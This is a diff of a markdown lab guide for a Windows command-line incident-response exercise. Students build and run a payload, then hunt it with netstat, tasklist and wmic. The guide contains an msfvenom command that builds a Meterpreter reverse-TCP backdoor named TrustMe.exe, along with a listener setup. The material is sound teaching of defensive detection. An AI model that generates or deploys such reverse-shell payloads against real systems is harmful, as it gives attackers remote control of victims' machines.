@@ -2,7 +2,17 @@
 
 # Windows CLI
 
-In this lab we will create some malware, run it and then use the tools we went through in the slides to look at what an attack looks like on a live system.  
+MITRE Shield
+------------
+
+Applicable MITRE Shield techniques:
+* [DTE0034](https://shield.mitre.org/techniques/DTE0034) - System Activity Monitoring
+* [DTE0021](https://shield.mitre.org/techniques/DTE0021) - Hunting
+
+Instructions
+------------
+
+In this lab we will create some malware, run it and then use the tools we went through in the slides to look at what an attack looks like on a live system.
 
 One of the best ways to learn, well...  Anything, is to actually just dig in and do it.  So, this is a great process for getting started in looking at actual malware.
 
@@ -24,20 +34,20 @@ $`ifconfig`
 
 ![](attachments/Clipboard_2020-06-12-12-35-15.png)
 
-Please note the IP address of your Ethernet adapter. 
+Please note the IP address of your Ethernet adapter.
 
-Please note that my adapter is called eth0 and my IP address is 172.26.19.133.   
+Please note that my adapter is called eth0 and my IP address is 172.26.19.133.
 
 Your IP Address and adapter name may be different.
 
 Please note your IP address for the ADHD Linux system on a piece of paper:
 
-Now, run the following commands to start a simple backdoor and backdoor listener: 
+Now, run the following commands to start a simple backdoor and backdoor listener:
 
 $ `sudo su -`
 Please note, the adhd password is adhd.
 
-/#`msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=<YOUR LINUX IP> lport=4444 
+/#`msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=<YOUR LINUX IP> lport=4444
 -f exe -o /tmp/TrustMe.exe`
 
 /#`cd /tmp`
@@ -86,7 +96,7 @@ Back at your Ubuntu prompt, you should have a metasploit session.
 
 Now, let's look at the malware from the other side through the Windows commandline slides!
 
-Please, remember, your IP address will be different!!! 
+Please, remember, your IP address will be different!!!
 
 Now, let's open another Command Prompt from our Terminal:
 
@@ -104,9 +114,9 @@ We will get the same lack of connections from C:\>`net session`
 
 ![](attachments/Clipboard_2020-12-09-13-27-35.png)
 
-While there is not much here for this lab, it is key to remember that these two commands would help us detect an attacker that is mounting shares on other computers (net view) and would tell us an attacker had mounted a share on this system (net session). 
+While there is not much here for this lab, it is key to remember that these two commands would help us detect an attacker that is mounting shares on other computers (net view) and would tell us an attacker had mounted a share on this system (net session).
 
-However, we are not done with network connections yet.  Lets try 
+However, we are not done with network connections yet.  Lets try
 
 C:\>`netstat -naob`
 
@@ -122,7 +132,7 @@ Now, let's drill down on that connection with some more data:
 
 C:\>`netstat -f`
 
-I like to run -f with netstat to see if there are any systems with fully qualified domains that we may be able to ignore. 
+I like to run -f with netstat to see if there are any systems with fully qualified domains that we may be able to ignore.
 
 ![](attachments/Clipboard_2020-12-09-13-48-21.png)
 
@@ -140,7 +150,7 @@ We can see in the above screenshot that we have the PID.
 
 Now, let's dive in!
 
-First we will start with tasklist  
+First we will start with tasklist
 
 C:\>`tasklist /m /fi "pid eq [PID]"`
 
@@ -165,7 +175,7 @@ C:\> `wmic process get name,parentprocessid,processid`
 
 ![](attachments/Clipboard_2020-12-09-14-01-04.png)
 
-Above we can see that we hunted the malicious process, then found its parent process ID, then did a find on that process ID.  As you can see above, it was launched by the browser_broker.exe process.  This once again, shows us that this process was launched from the browser. 
+Above we can see that we hunted the malicious process, then found its parent process ID, then did a find on that process ID.  As you can see above, it was launched by the browser_broker.exe process.  This once again, shows us that this process was launched from the browser.
 
 
 
@@ -176,6 +186,6 @@ Above we can see that we hunted the malicious process, then found its parent pro
 
 
 
- 
+
 
 
